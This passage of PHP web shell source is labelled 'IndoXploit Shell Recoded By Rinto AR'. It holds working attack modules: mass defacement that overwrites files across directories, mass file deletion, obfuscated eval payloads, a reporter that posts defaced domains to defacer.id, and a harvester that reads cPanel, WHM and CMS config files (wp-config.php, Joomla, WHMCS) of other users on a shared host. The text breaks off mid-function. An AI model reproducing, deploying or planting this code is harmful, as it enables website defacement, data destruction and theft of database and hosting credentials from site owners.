WE7Jz5jaHI8L29wdGlvbj4NCjxvcHRpb24gdmFsdWU9InNzcyIgc3R5bGU9J2JhY2tncm91bmQ6dHJhbnNwYXJlbnQ7Y29sb3I6YXF1YTsnPmh0bWxzcGVjaWFsY2hhcnM8L29wdGlvbj4NCjxvcHRpb24gdmFsdWU9ImVlZSIgc3R5bGU9J2JhY2tncm91bmQ6dHJhbnNwYXJlbnQ7Y29sb3I6YXF1YTsnPmVzY2FwZTwvb3B0aW9uPjwvc2VsZWN0Pjxicj48aW5wdXQgY2xhc3M9J2lucHV0emJ1dCcgdHlwZT0nc3VibWl0JyBuYW1lPSdzdWJtaXQnIHZhbHVlPSdFbmNvZGUnIHN0eWxlPSJiYWNrZ3JvdW5kOnRyYW5zcGFyZW50O2NvbG9yOmFxdWE7Ij4NCjxpbnB1dCBjbGFzcz0naW5wdXR6YnV0JyB0eXBlPSdzdWJtaXQnIG5hbWU9J2NyYWNrJyB2YWx1ZT0nRGVjb2RlJyBzdHlsZT0iYmFja2dyb3VuZDp0cmFuc3BhcmVudDtjb2xvcjphcXVhOyI+PGJyPg0KPC9zZWxlY3Q+Jm5ic3A7DQo8L2Zvcm0+DQo8P3BocCANCiRzdWJtaXQgPSAkX1BPU1RbJ3N1Ym1pdCddOw0KaWYgKGlzc2V0KCRzdWJtaXQpKXsNCiRvcCA9ICRfUE9TVFsib3BlIl07DQpzd2l0Y2ggKCRvcCkge2Nhc2UgJ2Jhc2U2NCc6ICRjb2RpPWJhc2U2NF9lbmNvZGUoJHRleHQpOw0KYnJlYWs7Y2FzZSAnc3RyJyA6ICRjb2RpPShiYXNlNjRfZW5jb2RlKHN0cl9yb3QxMyhnemRlZmxhdGUoc3RyX3JvdDEzKCR0ZXh0KSkpKSk7DQpicmVhaztjYXNlICdqc29uJyA6ICRjb2RpPWpzb25fZW5jb2RlKHV0ZjhfZW5jb2RlKCR0ZXh0KSk7DQpicmVhaztjYXNlICdnemluZmxhdGUnIDogJGNvZGk9YmFzZTY0X2VuY29kZShnemRlZmxhdGUoc3RyX3JvdDEzKCR0ZXh0KSkpOw0KYnJlYWs7Y2FzZSAnZ3ppbmZsYXRlcicgOiAkY29kaT1iYXNlNjRfZW5jb2RlKHN0cl9yb3QxMyhnemRlZmxhdGUoJHRleHQpKSk7DQpicmVhaztjYXNlICdnemluZmxhdGV4JyA6ICRjb2RpPWJhc2U2NF9lbmNvZGUoZ3pkZWZsYXRlKHN0cl9yb3QxMyhnemRlZmxhdGUoJHRleHQpKSkpOw0KYnJlYWs7Y2FzZSAnZ3ppbmZsYXRldycgOiAkY29kaT1iYXNlNjRfZW5jb2RlKGd6ZGVmbGF0ZShzdHJfcm90MTMocmF3dXJsZW5jb2RlKGd6ZGVmbGF0ZShjb252ZXJ0X3V1ZW5jb2RlKGJhc2U2NF9lbmNvZGUoc3RyX3JvdDEzKGd6ZGVmbGF0ZShjb252ZXJ0X3V1ZW5jb2RlKHJhd3VybGRlY29kZShzdHJfcm90MTMoJHRleHQpKSkpKSkpKSkpKSk7DQpicmVhaztjYXNlICdnemluZmxhdGVzJyA6ICRjb2RpPWJhc2U2NF9lbmNvZGUoZ3pkZWZsYXRlKCR0ZXh0KSk7DQpicmVhaztjYXNlICdzdHIyJyA6ICRjb2RpPWJhc2U2NF9lbmNvZGUoc3RyX3JvdDEzKCR0ZXh0KSk7DQpicmVhaztjYXNlICd1cmxlbmNvZGUnIDogJGNvZGk9cmF3dXJsZW5jb2RlKCR0ZXh0KTsNCmJyZWFrO2Nhc2UgJ2hleGVuY29kZScgOiAkY29kaT1iaW4yaGV4KCR0ZXh0KTsNCmJyZWFrO2Nhc2UgJ21kNScgOiAkY29kaT1tZDUoJHRleHQpOw0KYnJlYWs7Y2FzZSAndXInIDogJGNvZGk9Y29udmVydF91dWVuY29kZSgkdGV4dCk7DQpicmVhaztjYXNlICdzdHJfcm90MTMnIDogJGNvZGk9c3RyX3JvdDEzKCR0ZXh0KTsNCmJyZWFrO2Nhc2UgJ3NoYTEnIDogJGNvZGk9c2hhMSgkdGV4dCk7DQpicmVhaztjYXNlICdzdHJsZW4nIDogJGNvZGk9c3RybGVuKCR0ZXh0KTsNCmJyZWFrO2Nhc2UgJ3h4eCcgOiAkY29kaT1zdHJsZW4oYmluMmhleCgkdGV4dCkpOw0KYnJlYWs7Y2FzZSAnYmJiJyA6ICRjb2RpPWh0bWxlbnRpdGllcyh1dGY4X2RlY29kZSgkdGV4dCkpOw0KYnJlYWs7Y2FzZSAnYWFhJyA6ICRjb2RpPWNocihiaW4yaGV4KHN1YnN0cigkdGV4dCkpKTsNCmJyZWFrO2Nhc2UgJ3d3dycgOiAkY29kaT1jaHIoJHRleHQpOw0KYnJlYWs7Y2FzZSAnc3NzJyA6ICRjb2RpPWh0bWxzcGVjaWFsY2hhcnMoJHRleHQpOw0KYnJlYWs7Y2FzZSAnZWVlJyA6ICRjb2RpPWFkZHNsYXNoZXMoJHRleHQpOw0KYnJlYWs7Y2FzZSAndXJsJyA6ICRjb2RpPWJhc2U2NF9lbmNvZGUoZ3pkZWZsYXRlKGNvbnZlcnRfdXVlbmNvZGUoc3RyX3JvdDEzKGd6ZGVmbGF0ZShiYXNlNjRfZW5jb2RlKCR0ZXh0KSkpKSkpOw0KYnJlYWs7ZGVmYXVsdDpicmVhazt9fQ0KDQokc3VibWl0ID0gJF9QT1NUWydjcmFjayddOw0KaWYgKGlzc2V0KCRzdWJtaXQpKXsNCiRvcCA9ICRfUE9TVFsib3BlIl07DQpzd2l0Y2ggKCRvcCkge2Nhc2UgJ2Jhc2U2NCc6ICRjb2RpPWJhc2U2NF9kZWNvZGUoJHRleHQpOw0KYnJlYWs7Y2FzZSAnc3RyJyA6ICRjb2RpPXN0cl9yb3QxMyhnemluZmxhdGUoc3RyX3JvdDEzKGJhc2U2NF9kZWNvZGUoKCR0ZXh0KSkpKSk7DQpicmVhaztjYXNlICdqc29uJyA6ICRjb2RpPXV0ZjhfZGVuY29kZShqc29uX2RlbmNvZGUoJHRleHQpKTsNCmJyZWFrO2Nhc2UgJ2d6aW5mbGF0ZScgOiAkY29kaT1zdHJfcm90MTMoZ3ppbmZsYXRlKGJhc2U2NF9kZWNvZGUoJHRleHQpKSk7DQpicmVhaztjYXNlICdnemluZmxhdGVyJyA6ICRjb2RpPWd6aW5mbGF0ZShzdHJfcm90MTMoYmFzZTY0X2RlY29kZSgkdGV4dCkpKTsNCmJyZWFrO2Nhc2UgJ2d6aW5mbGF0ZXgnIDogJGNvZGk9Z3ppbmZsYXRlKHN0cl9yb3QxMyhnemluZmxhdGUoYmFzZTY0X2RlY29kZSgkdGV4dCkpKSk7DQpicmVhaztjYXNlICdnemluZmxhdGV3JyA6ICRjb2RpPXN0cl9yb3QxMyhyYXd1cmxkZWNvZGUoY29udmVydF91dWRlY29kZShnemluZmxhdGUoc3RyX3JvdDEzKGJhc2U2NF9kZWNvZGUoY29udmVydF91dWRlY29kZShnemluZmxhdGUocmF3dXJsZGVjb2RlKHN0cl9yb3QxMyhnemluZmxhdGUoYmFzZTY0X2RlY29kZSgkdGV4dCkpKSkpKSkpKSkpKTsNCmJyZWFrO2Nhc2UgJ2d6aW5mbGF0ZXMnIDogJGNvZGk9Z3ppbmZsYXRlKGJhc2U2NF9kZWNvZGUoJHRleHQpKTsNCmJyZWFrO2Nhc2UgJ3N0cjInIDogJGNvZGk9c3RyX3JvdDEzKGJhc2U2NF9kZWNvZGUoJHRleHQpKTsNCmJyZWFrO2Nhc2UgJ3VybGVuY29kZScgOiAkY29kaT1yYXd1cmxkZWNvZGUoJHRleHQpOw0KYnJlYWs7Y2FzZSAnaGV4ZW5jb2RlJyA6ICRjb2RpPXF1b3RlZF9wcmludGFibGVfZGVjb2RlKCR0ZXh0KTsNCmJyZWFrO2Nhc2UgJ3VyJyA6ICRjb2RpPWNvbnZlcnRfdXVkZWNvZGUoJHRleHQpOw0KYnJlYWs7Y2FzZSAndXJsJyA6ICRjb2RpPWJhc2U2NF9kZWNvZGUoZ3ppbmZsYXRlKHN0cl9yb3QxMyhjb252ZXJ0X3V1ZGVjb2RlKGd6aW5mbGF0ZShiYXNlNjRfZGVjb2RlKCgkdGV4dCkpKSkpKSk7DQpicmVhaztkZWZhdWx0OmJyZWFrO319DQokaHRtbCA9IGh0bWxlbnRpdGllcyhzdHJpcHNsYXNoZXMoJGNvZGkpKTsNCmVjaG8gIjxmcm9tPjxjZW50ZXI+PGgzPjxmb250IHNpemU9NCBmYWNlPWNoaWxsZXIgY29sb3I9YXF1YT5Ja2tlaCBLaW1vY2hpIFlhbWV0dGUgS3VkYXNhaS48L2gzPjwvY2VudGVyPjx0ZXh0YXJlYSBjb2xzPTcwIHJvd3M9MjAgc3R5bGU9J29uZm9jdXMoKTtmb250LXdlaWdodDpib2xkO2NvbG9yOnJlZDtiYWNrZ3JvdW5kLWltYWdlOiB0cmFuc3BhcmVudDtvcGFjaXR5OjAuNDA7YmFja2dyb3VuZC1zaXplOjEwMCU7YmFja2dyb3VuZC1yZXBlYXQ6IG5vLXJlcGVhdDsnIGNsYXNzPSdpbnB1dHonIHJlYWRvbmx5PiIuJGh0bWwuIjwvdGV4dGFyZWE+PEJSLz48QlIvPjwvY2VudGVyPjwvZnJvbT4iOw0KPz4NCjxmb290ZXIgc3R5bGU9InRleHQtc2hhZG93OiAwIDAgNnB4ICNGRjAwMDAsIDAgMCA1cHggI0ZGMDAwMCwgMCAwIDVweCAjRkYwMDAwOyBwb3NpdGlvbjpmaXhlZDsgbGVmdDoxcHg7IHJpZ2h0OjBweDsgdG9wOjBweDsgYm9yZGVyLWJvdHRvbTogMXB4IHNvbGlkIHJlZCA7Ij4NCjxjZW50ZXI+PGI+PGZvbnQgZmFjZT0iUXVpY2tzYW5kIiBjb2xvcj0iYmxhY2siIHNpemU9IjMiIHN0eWxlPSJ0ZXh0LXNoYWRvdzogMCAwIDVweCAjMmYyYjJiLCAwIDAgMTBweCAjMmYyYjJiLCAwIDAgMjBweCAjMmYyYjJiLCAwIDAgNDVweCAjMmYyYjJiLCAwIDAgNDBweCAjMmYyYjJiOyI+DQo8Zm9udCBmYWNlPSJBZ2VuY3kgRkIiIGNvbG9yPSJyZWQiIHNpemU9IjQiIHN0eWxlPSJ0ZXh0LXNoYWRvdzogMCAwIDZweCBibGFjaywgMCAwIDVweCBibGFjaywgMCAwIDVweCBibGFjazsiPg0KPGNlbnRlcj48Zm9udCBjb2xvcj0icmVkIiBzaXplPSI0IiBmYWNlPSJBZ2VuY3kgRkIiPkNvZGVkIGJ5IFJpbnRvIEFSLjwvRk9OVD48L2Zvb3Rlcj48L2h0bWw+';
			$file = fopen("decode.php","w+"); $write = fwrite ($file ,base64_decode($netnotahh)); $file = fopen("/","decode.php");
			$rt="<br><a href=decode.php TARGET='_blank'>";
	echo "<br><br><br><a href=decode.php TARGET='_blank'><b>Done.. !</a></b><br><br>$rt</center>";} echo "</form>";
} elseif($_GET['do'] == 'mass_deface') {
	echo "<center><form action=\"\" method=\"post\">\n";
	$dirr=$_POST['d_dir'];
	$index = $_POST["script"];
	$index = str_replace('"',"'",$index);
	$index = stripslashes($index);
	function edit_file($file,$index){
		if (is_writable($file)) {
		clear_fill($file,$index);
		echo "<Span style='color:green;'><strong> [+] Nyabun 100% Successfull </strong></span><br></center>";
		} 
		else {
			echo "<Span style='color:red;'><strong> [-] Ternyata Tidak Boleh Menyabun Disini :( </strong></span><br></center>";
			}
			}
	function hapus_massal($dir,$namafile) {
		if(is_writable($dir)) {
			$dira = scandir($dir);
			foreach($dira as $dirb) {
				$dirc = "$dir/$dirb";
				$lokasi = $dirc.'/'.$namafile;
				if($dirb === '.') {
					if(file_exists("$dir/$namafile")) {
						unlink("$dir/$namafile");
					}
				} elseif($dirb === '..') {
					if(file_exists("".dirname($dir)."/$namafile")) {
						unlink("".dirname($dir)."/$namafile");
					}
				} else {
					if(is_dir($dirc)) {
						if(is_writable($dirc)) {
							if(file_exists($lokasi)) {
								echo "[<font color=lime>DELETED</font>] $lokasi<br>";
								unlink($lokasi);
								$idx = hapus_massal($dirc,$namafile);
							}
						}
					}
				}
			}
		}
	}
	function clear_fill($file,$index){
		if(file_exists($file)){
			$handle = fopen($file,'w');
			fwrite($handle,'');
			fwrite($handle,$index);
			fclose($handle);  } }

	function gass(){
		global $dirr , $index ;
		chdir($dirr);
		$me = str_replace(dirname(__FILE__).'/','',__FILE__);
		$files = scandir($dirr) ;
		$notallow = array(".htaccess","error_log","_vti_inf.html","_private","_vti_bin","_vti_cnf","_vti_log","_vti_pvt","_vti_txt","cgi-bin",".contactemail",".cpanel",".fantasticodata",".htpasswds",".lastlogin","access-logs","cpbackup-exclude-used-by-backup.conf",".cgi_auth",".disk_usage",".statspwd","..",".");
		sort($files);
		$n = 0 ;
		foreach ($files as $file){
			if ( $file != $me && is_dir($file) != 1 && !in_array($file, $notallow) ) {
				echo "<center><Span style='color: #8A8A8A;'><strong>$dirr/</span>$file</strong> ====> ";
				edit_file($file,$index);
				flush();
				$n = $n +1 ;
				} 
				}
				echo "<br>";
				echo "<center><br><h3>$n Kali Anda Telah Ngecrot  Disini </h3></center><br>";
					}
	function ListFiles($dirrall) {

    if($dh = opendir($dirrall)) {

       $files = Array();
       $inner_files = Array();
       $me = str_replace(dirname(__FILE__).'/','',__FILE__);
       $notallow = array($me,".htaccess","error_log","_vti_inf.html","_private","_vti_bin","_vti_cnf","_vti_log","_vti_pvt","_vti_txt","cgi-bin",".contactemail",".cpanel",".fantasticodata",".htpasswds",".lastlogin","access-logs","cpbackup-exclude-used-by-backup.conf",".cgi_auth",".disk_usage",".statspwd","Thumbs.db");
        while($file = readdir($dh)) {
            if($file != "." && $file != ".." && $file[0] != '.' && !in_array($file, $notallow) ) {
                if(is_dir($dirrall . "/" . $file)) {
                    $inner_files = ListFiles($dirrall . "/" . $file);
                    if(is_array($inner_files)) $files = array_merge($files, $inner_files);
                } else {
                    array_push($files, $dirrall . "/" . $file);
                }
            }
			}

			closedir($dh);
			return $files;
		}
	}
	function gass_all(){
		global $index ;
		$dirrall=$_POST['d_dir'];
		foreach (ListFiles($dirrall) as $key=>$file){
			$file = str_replace('//',"/",$file);
			echo "<center><strong>$file</strong> ===>";
			edit_file($file,$index);
			flush();
		}
		$key = $key+1;
	echo "<center><br><h3>$key Kali Anda Telah Ngecrot  Disini  </h3></center><br>"; }
	function sabun_massal($dir,$namafile,$isi_script) {
		if(is_writable($dir)) {
			$dira = scandir($dir);
			foreach($dira as $dirb) {
				$dirc = "$dir/$dirb";
				$lokasi = $dirc.'/'.$namafile;
				if($dirb === '.') {
					file_put_contents($lokasi, $isi_script);
				} elseif($dirb === '..') {
					file_put_contents($lokasi, $isi_script);
				} else {
					if(is_dir($dirc)) {
						if(is_writable($dirc)) {
							echo "[<font color=lime>DONE</font>] $lokasi<br>";
							file_put_contents($lokasi, $isi_script);
							$idx = sabun_massal($dirc,$namafile,$isi_script);
						}
					}
				}
			}
		}
	}
	if($_POST['mass'] == 'onedir') {
		echo "<br> Versi Text Area<br><textarea style='background:black;outline:none;color:red;' name='index' rows='10' cols='67'>\n";
		$ini="http://";
		$mainpath=$_POST[d_dir];
		$file=$_POST[d_file];
		$dir=opendir("$mainpath");
		$code=base64_encode($_POST[script]);
		$indx=base64_decode($code);
		while($row=readdir($dir)){
		$start=@fopen("$row/$file","w+");
		$finish=@fwrite($start,$indx);
		if ($finish){
			echo"$ini$row/$file\n";
			}
		}
		echo "</textarea><br><br><br><b>Versi Text</b><br><br><br>\n";
		$mainpath=$_POST[d_dir];$file=$_POST[d_file];
		$dir=opendir("$mainpath");
		$code=base64_encode($_POST[script]);
		$indx=base64_decode($code);
		while($row=readdir($dir)){$start=@fopen("$row/$file","w+");
		$finish=@fwrite($start,$indx);
		if ($finish){echo '<a href="http://' . $row . '/' . $file . '" target="_blank">http://' . $row . '/' . $file . '</a><br>'; }
		}

	}
	elseif($_POST['mass'] == 'sabunkabeh') { gass(); }
	elseif($_POST['mass'] == 'hapusmassal') { hapus_massal($_POST['d_dir'], $_POST['d_file']); }
	elseif($_POST['mass'] == 'sabunmematikan') { gass_all(); }
	elseif($_POST['mass'] == 'massdeface') {
		echo "<div style='margin: 5px auto; padding: 5px'>";
		sabun_massal($_POST['d_dir'], $_POST['d_file'], $_POST['script']);
		echo "</div>";	}
	else {
		echo "
		<center><font style='text-decoration: underline;'>
		Select Type:<br>
		</font>
		<select class=\"select\" name=\"mass\"  style=\"width: 450px;\" height=\"10\">
		<option value=\"onedir\">Mass Deface 1 Dir</option>
		<option value=\"massdeface\">Mass Deface ALL Dir</option>
		<option value=\"sabunkabeh\">Sabun Massal Di Tempat</option>
		<option value=\"sabunmematikan\">Sabun Massal Bunuh Diri</option>
		<option value=\"hapusmassal\">Mass Delete Files</option></center></select><br>
		<font style='text-decoration: underline;'>Folder:</font><br>
		<input type='text' name='d_dir' value='$dir' style='width: 450px;' height='10'><br>
		<font style='text-decoration: underline;'>Filename:</font><br>
		<input type='text' name='d_file' value='xai.php' style='width: 450px;' height='10'><br>
		<font style='text-decoration: underline;'>Index File:</font><br>
		<textarea name='script' style='width: 450px; height: 200px;'>Hacked By Rinto AR</textarea><br>
		<input type='submit' name='start' value='Mass Deface' style='width: 450px;'>
		</form></center>";
		}
	} elseif($_GET['do'] == 'shellchk') {
		eval(str_rot13(gzinflate(str_rot13(base64_decode(('vUddQtswFH1epf4HcCE1VUxbNvEwdSMGd9FeJtGhPaygyLZ5B6jc5AaHORP/fdf5IoXxsBeiSbGdZu491z6+cTiA1GVPdCkwDTIaDnM5lyVupoT5Nc1ymWWmWpZdRm9FXWOGqzguTlue4Utjpa+p53a411OCIcKZFCxqGVUES63F8XGSylAx3jr+oATX45SXE3LBubGwAsM16RLpY5Jlp+aHh1RR8jscWaPZpI0dzbay/hdZJJqkziiFUZV5t5ohSmIE1POy0M+Bl+381rjEL1whj5xmh/kwvC85oifDTp6wqlXyADr2ynAJKJgpiEaeTrCvLaDIA/J0OCD47FswS6Yi85pEzzrYVoNF2ujEg0OX0jJ1duvpWlW+hORmhxQIElNvPuS/inBksxEA98JsNaPjRIiU9civj2FpYL5jhElwWdN8KmUSZ3fm5NNn2pVFMWILSHUuPTFerhbfSYs1Xax+nV2s4u+Xl4slegNI6MckWBxvdmiUx6SRWHUftOXZ5jWmD/Gi9qAUbdMVvKPKP6elKVxA1QayIrWnG3A59y6ibiMjrDMd9OI+9UfcyU9QsvB3W5VwT4eDHam5xc85F8ACd40q3EvfeMxADe3HzatgAcLD58AhwYNoyOxJDvqc5pYhhrOHCO8Y097nXM6vJACLfvCEct6IWaMfGxj5VXOGSwk5Opai4J5n72gj0Wfza+sM+x29+D6bR5eFWaK2xCcCQcELBxy9Y8DbOjFY2nF26JjF88lC3zmYZHEJ8hYkTFaJFtp7j3dpzPvfdKxZKYx9j1CWkFJfuSbvZMzDAf78MRdXgQ724/Oz5cVtR7dA7BK95oW9TvX6id8rrLYhYIaupzSEqntthpHSeYK2aXmfYEWLxqojGkjH3mRJcryqge1uN6CvYvgbLZdJJPqPi928ml2vNqHd+yU4Q6botthiDsI//AU='))))));
		
	} elseif($_GET['do'] == 'loghunter')
	{eval(str_rot13(gzinflate(str_rot13(base64_decode(("tUl7YtpVEP87VXyHiZMr0BLsPJqqgJ14QyBquuNrXEUlEExeeL2E5hZ7wS5pmu9+s7ZWgDM5RCmWJXt0f7Pz3JnJ52lphOsTQ+odbjFOjaGl1CCfWIlGTyPgLguIpQ+VoQKRYD7x8N8mDhsqC/iZRJ9DoxtDqNYDyx4xYA+20BUmvjEF7mw4wlL9WZ8J5o69b6lpcyhg8Qipju+aXkAVo35z+/az5KVGhoozmlEBilhLltbJyVCl6WULvpDx7kNE11lDpQ14NJsKY9hQKEyligc8DHNJFU8xcrXUKgRGV6hWhVooC6xMRCshRH2fz31OLQCfKtyQGVyNpOOg+DflE+hSPAhY+VyXsxRlZ6p3x+qRaWsK2sfqx3B13OZmN4E1QrZ9xuyqqkG5KyaEzCsuidTJdfbJEWEGzOYOE5PAim4j1fEJ/eSOSz7XHm5cqFE2n3bv1XwO4jeYFvfNxmyzNSgkrivclR7zuenIilALjFRpEM65SNzHY2A0nGubQ8Fdv+igZpH2sgfcAblAO6Vpj8lUPkUQYezqhVcB3r2DxaJFKL2AlvDykRjQbmRtpXt90eu0zi/+MJu9U/uijb8VuUxbclBEsBs45k+zkpS3K6iYBVLFaBylnOgI0hRL5Y3FQXRZfmiYBqEwMTNal2AkLeYk59Uya4KEVgfxLZhvd2PP9Djjmxm+i3WCbKyD0jm/ely2bV0lC8ZrMI/PSC4dTjskikOPWSQKiiRBlYk2KBQLancWQQZPKjtVNbgbxDLisK9w5ZNcjAFea4uBWE9P9T1a6/e7mtFxb8YtIi+SxYw7S8EcHX4+7R8bVxyhipKCcTHI0urpvyS8ijMz4sz1Wh6GxcLeoH3wp2nwmR/8RjF/+WNj9+FKVsElEitlvUooy9iV913ikmym133XiZ2pQbgjQUJZQrjEE5mO2peRjLGrIc0EvygbVDwqA/c8J+SOLzB2Q6kSJp0MzIZnS+ZUHcuQxS8P5vT/2KW2meKRHbey2DEnkutEuHe1GtDBZRMI6HD2F8rxaCjBjx+QTxpKDfidRgsLX/VsOyt7Mm/6IohStil49uKEetKv3+73D0KMWDsk3BP0jfIvrUvo8YG21e3o94+7mnP8FXTYGyqXptOW2vVBNe2kdNwiZh+r/Ns6D/N6WPV+vrTAT8slKBWe8WvLrREPoeMLav70RqakveP7ZuvYcdErllZIvvJ77rg0sNlJhj1PnYNCxUdCm/1rPK6MLByKKpbARIhG7ES6OQm5NTdvM7826yo34HbLiMVo85WApX0fXpBkw5+LB9CNtD7hkLPex0rFQBHbKs5S5j2nxQVCGfrXN63ehflb++a622H1zN56+/qm9OpMGzw9o09LDyIMydh1CsuTqb6lvxOKR6yiefbiK97cQF4lre4/idARGdaujmDr5XvpxPQXP/guZC3mu3GcxgGvFiMWRjD2jvXBa3biz+dp/gU="))))));}	
elseif($_GET['do'] == 'metu') {
	

echo '<form action="?dir=$dir&do=metu" method="post">';
    unset($_SESSION[md5($_SERVER['HTTP_HOST'])]); 
    echo 'Byee !';
	
}
elseif($_GET['do'] == 'about') {
	
    echo '<center>BcctNgtd Shell<hr>IndoXploit Shell Recoded By Rinto AR<br>Akoh Tamvan Qaqa :v';
	
}
elseif($_GET['do'] == 'defacerid') {
echo "<center><form method='post'>
		<u>Defacer</u>: <br>
		<input type='text' name='hekel' size='50' value='Rinto AR'><br>
		<u>Team</u>: <br>
		<input type='text' name='tim' size='50' value='XaiSyndicate'><br>
		<u>Domains</u>: <br>
		<textarea style='width: 450px; height: 150px;' name='sites'></textarea><br>
		<input type='submit' name='go' value='Submit' style='width: 450px;'>
		</form>";
$site = explode("\r\n", $_POST['sites']);
$go = $_POST['go'];
$hekel = $_POST['hekel'];
$tim = $_POST['tim'];
if($go) {
foreach($site as $sites) {
$zh = $sites;
$form_url = "https://www.defacer.id/notify";
$data_to_post = array();
$data_to_post['attacker'] = "$hekel";
$data_to_post['team'] = "$tim";
$data_to_post['poc'] = 'SQL Injection';
$data_to_post['url'] = "$zh";
$curl = curl_init();
curl_setopt($curl,CURLOPT_URL, $form_url);
curl_setopt($curl,CURLOPT_POST, sizeof($data_to_post));
curl_setopt($curl, CURLOPT_USERAGENT, "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.1.4322; .NET CLR 2.0.50727)"); //msnbot/1.0 (+http://search.msn.com/msnbot.htm)
curl_setopt($curl,CURLOPT_POSTFIELDS, $data_to_post);
curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($curl, CURLOPT_REFERER, 'https://defacer.id/notify.html');
$result = curl_exec($curl);
echo $result;
curl_close($curl);
echo "<br>";
}
}
}

elseif($_GET['do'] == 'config') {
	if($_POST){
		$passwd = $_POST['passwd'];
		mkdir("xai_config", 0777);
		$isi_htc = "Options all\nRequire None\nSatisfy Any";
		$htc = fopen("xai_config/.htaccess","w");
		fwrite($htc, $isi_htc);
		preg_match_all('/(.*?):x:/', $passwd, $user_config);
		foreach($user_config[1] as $user_cox) {
			$user_config_dir = "/home/$user_cox/public_html/";
			if(is_readable($user_config_dir)) {
				$grab_config = array(
					"/home/$user_cox/.my.cnf" => "cpanel",
					"/home/$user_cox/.accesshash" => "WHM-accesshash",
					"/home/$user_cox/public_html/bw-configs/config.ini" => "BosWeb",
					"/home/$user_cox/public_html/config/koneksi.php" => "Lokomedia",
					"/home/$user_cox/public_html/lokomedia/config/koneksi.php" => "Lokomedia",
					"/home/$user_cox/public_html/clientarea/configuration.php" => "WHMCS",
					"/home/$user_cox/public_html/whm/configuration.php" => "WHMCS",
					"/home/$user_cox/public_html/whmcs/configuration.php" => "WHMCS",
					"/home/$user_cox/public_html/forum/config.php" => "phpBB",
					"/home/$user_cox/public_html/sites/default/settings.php" => "Drupal",
					"/home/$user_cox/public_html/config/settings.inc.php" => "PrestaShop",
					"/home/$user_cox/public_html/app/etc/local.xml" => "Magento",
					"/home/$user_cox/public_html/joomla/configuration.php" => "Joomla",
					"/home/$user_cox/public_html/configuration.php" => "Joomla",
					"/home/$user_cox/public_html/wp/wp-config.php" => "WordPress",
					"/home/$user_cox/public_html/wordpress/wp-config.php" => "WordPress",
					"/home/$user_cox/public_html/wp-config.php" => "WordPress",
					"/home/$user_cox/public_html/admin/config.php" => "OpenCart",
					"/home/$user_cox/public_html/slconfig.php" => "Sitelok",
					"/home/$user_cox/public_html/application/config/database.php" => "Ellislab",
					"/home1/$user_cox/.my.cnf" => "cpanel",
					"/home1/$user_cox/.accesshash" => "WHM-accesshash",
					"/home1/$user_cox/public_html/bw-configs/config.ini" => "BosWeb",
					"/home1/$user_cox/public_html/config/koneksi.php" => "Lokomedia",
					"/home1/$user_cox/public_html/lokomedia/config/koneksi.php" => "Lokomedia",
					"/home1/$user_cox/public_html/clientarea/configuration.php" => "WHMCS",
					"/home1/$user_cox/public_html/whm/configuration.php" => "WHMCS",
					"/home1/$user_cox/public_html/whmcs/configuration.php" => "WHMCS",
					"/home1/$user_cox/public_html/forum/config.php" => "phpBB",
					"/home1/$user_cox/public_html/sites/default/settings.php" => "Drupal",						"/home1/$user_cox/public_html/config/settings.inc.php" => "PrestaShop",
					"/home1/$user_cox/public_html/app/etc/local.xml" => "Magento",
					"/home1/$user_cox/public_html/joomla/configuration.php" => "Joomla",
					"/home1/$user_cox/public_html/configuration.php" => "Joomla",
					"/home1/$user_cox/public_html/wp/wp-config.php" => "WordPress",
					"/home1/$user_cox/public_html/wordpress/wp-config.php" => "WordPress",
					"/home1/$user_cox/public_html/wp-config.php" => "WordPress",
					"/home1/$user_cox/public_html/admin/config.php" => "OpenCart",
					"/home1/$user_cox/public_html/slconfig.php" => "Sitelok",
					"/home1/$user_cox/public_html/application/config/database.php" => "Ellislab",
					"/home2/$user_cox/.my.cnf" => "cpanel",
					"/home2/$user_cox/.accesshash" => "WHM-accesshash",
					"/home2/$user_cox/public_html/bw-configs/config.ini" => "BosWeb",
					"/home2/$user_cox/public_html/config/koneksi.php" => "Lokomedia",
					"/home2/$user_cox/public_html/lokomedia/config/koneksi.php" => "Lokomedia",
					"/home2/$user_cox/public_html/clientarea/configuration.php" => "WHMCS",
					"/home2/$user_cox/public_html/whm/configuration.php" => "WHMCS",
					"/home2/$user_cox/public_html/whmcs/configuration.php" => "WHMCS",
					"/home2/$user_cox/public_html/forum/config.php" => "phpBB",
					"/home2/$user_cox/public_html/sites/default/settings.php" => "Drupal",
					"/home2/$user_cox/public_html/config/settings.inc.php" => "PrestaShop",
					"/home2/$user_cox/public_html/app/etc/local.xml" => "Magento",
					"/home2/$user_cox/public_html/joomla/configuration.php" => "Joomla",
					"/home2/$user_cox/public_html/configuration.php" => "Joomla",
					"/home2/$user_cox/public_html/wp/wp-config.php" => "WordPress",
					"/home2/$user_cox/public_html/wordpress/wp-config.php" => "WordPress",
					"/home2/$user_cox/public_html/wp-config.php" => "WordPress",
					"/home2/$user_cox/public_html/admin/config.php" => "OpenCart",
					"/home2/$user_cox/public_html/slconfig.php" => "Sitelok",
					"/home2/$user_cox/public_html/application/config/database.php" => "Ellislab",
					"/home3/$user_cox/.my.cnf" => "cpanel",
					"/home3/$user_cox/.accesshash" => "WHM-accesshash",
					"/home3/$user_cox/public_html/bw-configs/config.ini" => "BosWeb",
					"/home3/$user_cox/public_html/config/koneksi.php" => "Lokomedia",
					"/home3/$user_cox/public_html/lokomedia/config/koneksi.php" => "Lokomedia",
					"/home3/$user_cox/public_html/clientarea/configuration.php" => "WHMCS",
					"/home3/$user_cox/public_html/whm/configuration.php" => "WHMCS",
					"/home3/$user_cox/public_html/whmcs/configuration.php" => "WHMCS",
					"/home3/$user_cox/public_html/forum/config.php" => "phpBB",
					"/home3/$user_cox/public_html/sites/default/settings.php" => "Drupal",
					"/home3/$user_cox/public_html/config/settings.inc.php" => "PrestaShop",
					"/home3/$user_cox/public_html/app/etc/local.xml" => "Magento",
					"/home3/$user_cox/public_html/joomla/configuration.php" => "Joomla",
					"/home3/$user_cox/public_html/configuration.php" => "Joomla",
					"/home3/$user_cox/public_html/wp/wp-config.php" => "WordPress",
					"/home3/$user_cox/public_html/wordpress/wp-config.php" => "WordPress",
					"/home3/$user_cox/public_html/wp-config.php" => "WordPress",
					"/home3/$user_cox/public_html/admin/config.php" => "OpenCart",
					"/home3/$user_cox/public_html/slconfig.php" => "Sitelok",
					"/home3/$user_cox/public_html/application/config/database.php" => "Ellislab"
						);	
					foreach($grab_config as $config => $nama_config) {
						$ambil_config = file_get_contents($config);
						if($ambil_config == '') {
						} else {
